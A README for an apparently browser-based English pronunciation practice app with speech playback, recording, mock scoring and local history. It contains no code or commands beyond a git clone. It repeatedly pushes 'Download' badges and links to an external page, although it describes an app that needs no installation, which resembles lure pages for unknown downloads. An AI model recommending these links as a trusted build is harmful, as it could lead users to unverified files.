# English Pronunciation v2 - AI Pronunciation Practice 2026

> **A browser-based AI pronunciation practice app for English that brings together sentence entry, US speech playback, voice recording, and feedback tools in version 2.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brookshenry1989/english-pronunciation-v2?style=flat-square)](https://github.com/brookshenry1989/english-pronunciation-v2)

---

<p align="center">
  <a href="https://brookshenry1989.github.io/english-pronunciation-v2/">
    <img src="https://img.shields.io/badge/Download-English%20Pronunciation%20Latest-brightgreen?style=for-the-badge" alt="Download English Pronunciation">
  </a>
</p>

> **[Direct Download - English Pronunciation v2](https://brookshenry1989.github.io/english-pronunciation-v2/)**

---

[Download Latest Build](https://brookshenry1989.github.io/english-pronunciation-v2/)

---

## Overview

English Pronunciation is a web app focused on pronunciation drills, listening practice, and session review. In the browser, you can type English sentences, hear a standard US-style reference pronunciation, and repeat the same material as often as needed.

It is intended for learners who want a low-friction way to practice speaking without installing extra software. The app also includes recording, audio export, practice history, and feedback-oriented prompts so you can revisit sessions and keep improving over time.

---

## What It Offers

- Add your own English sentences for practice
- Listen to a standard US pronunciation for side-by-side comparison
- Record speech directly in the browser
- Save recorded audio for later playback
- View mock pronunciation scores while practicing
- Receive session-based suggestions for improvement
- Keep a local practice history
- Access a simulated login and profile screen for a more app-like flow

---

## Installation

1. Clone the repository or download the project files:
   ```bash
   git clone https://github.com/brookshenry1989/english-pronunciation-v2.git
   ```
2. Open the project in a modern browser or serve it through a local web server.
3. Launch the main HTML file and start a practice session.

If you are using a static host, place the files in your web root and open the landing page after deployment.

---

## How to Use It

1. Open the app in your browser.
2. Use the simulated login flow if you want to sign in.
3. Type one or more English sentences into the practice area.
4. Play the reference audio and speak the sentence aloud yourself.
5. Record your voice, then download the audio if you want to keep it.
6. Check the score, suggestions, and history after each round.

For best results, repeat the same sentence several times and compare recordings across sessions.

---

## Configuration

Most behavior is controlled in the browser and saved locally.

Typical data sources include:

- `localStorage` for practice history and saved preferences
- Browser speech features for text-to-speech playback
- Optional Firebase-related integration points if enabled in the project

If you customize the app, check the main HTML and script files for sentence handling, recording behavior, and any profile or login settings.

---

## Requirements

- A modern web browser
- JavaScript enabled
- Microphone access for recording
- Support for Web Speech API features where available
- Sufficient local storage for history and saved app data
- Optional Firebase configuration if you connect the app to remote services

---

## FAQ

**How do I get the latest version?**  
Replace the current project files with the newest build and refresh the page.

**Where does the app keep my practice data?**  
Practice history and related preferences stay in the browser unless you wire up external services.

**Why are the scores marked as simulated?**  
The scoring is mock-based and meant to guide practice, not to serve as formal assessment.

**What should I check if playback or recording fails?**  
Verify browser permissions, microphone access, and support for the required web APIs.

**Can I clear or change stored settings?**  
Yes. Settings are typically saved in the browser and can be removed through site data controls.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
